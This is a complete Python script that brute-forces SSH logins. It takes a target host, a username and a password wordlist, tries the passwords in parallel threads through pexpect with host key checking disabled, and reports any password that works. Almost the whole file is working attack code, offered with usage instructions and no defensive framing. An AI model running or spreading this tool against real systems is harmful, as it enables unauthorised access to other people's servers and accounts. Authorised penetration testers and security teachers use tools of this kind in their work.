#!/usr/bin/python3

# usage: python sshBrute.py -H 127.0.0.1 -u root -F pass.txt

from pexpect import pxssh
import optparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0
HostNA = 0


def connect(host, user, password, release):
    global Found
    global Fails
    global HostNA
    try:
        s = pxssh.pxssh(options={
            "StrictHostKeyChecking": "no",
            "UserKnownHostsFile": "/dev/null"})
        s.login(host, user, password)
        print("[+] Password found: {}".format(password))
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
        elif 'Could not establish connection to host' in str(e):
            print("[-] Host not available {}".format(host))
            HostNA = 1
        else:
            print("Exception: {}".format(e))
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser(
        'usage%prog -H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string',
                      help='specify target host')
    parser.add_option('-F', dest='passwdFile', type='string',
                      help='specify password file')
    parser.add_option('-u', dest='user', type='string',
                      help='specify the user')

    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user

    if host == None or passwdFile == None or user == None:
        print(parser.usage)
        exit(0)

    fn = open(passwdFile, 'r')
    for line in fn.readlines():

        if Found:
            print("[*] Exiting: password found")
            exit(0)
        if Fails > 5:
            print("[!] Exiting: Too Many Socket Timeouts")
            exit(0)
        if HostNA:
            print("[!] Exiting: Host not available")
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print("[-] Testing: {}".format(password))
        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()


if __name__ == '__main__':
    main()
